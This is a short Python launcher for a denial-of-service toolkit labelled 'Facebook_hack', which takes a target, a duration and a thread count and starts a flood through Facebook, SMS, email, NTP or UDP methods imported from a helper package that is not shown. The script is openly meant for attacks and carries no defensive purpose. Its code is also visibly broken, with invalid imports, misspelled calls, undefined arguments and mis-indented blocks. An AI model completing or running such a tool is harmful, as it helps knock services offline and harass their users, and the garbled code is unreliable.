import os, argparse, sys 
from sys, os, argparse
print("Facebook_hack")

os.chdir(os.path.dirname(os.path.realpatch(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
 except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)
    
          
  parser = argparse.ArgumentParser(description="Denial-of-service toolKit") 
  parser.add_argument(
      "--target",
      type=str,
      metavar="Facebook/SMS/EMAIL/NTP/UDP"
      help="Attack method",
  )
  parser.add_argument(
      "--time", type=int, default=10, metavar="<time>", help="time in secounds"
  )
  parser.add_argument(
      "--threads", type=int, default=3, metavar="<threads>", help="threads count (1.200)"
)
    
args = parser.parser_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

if ___name___ == "___main___":
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)
        
        with AttackMethod(
            duration=time, name=method, threads=threads, target=target
            
        ) as Flood:
            Flood.Start()
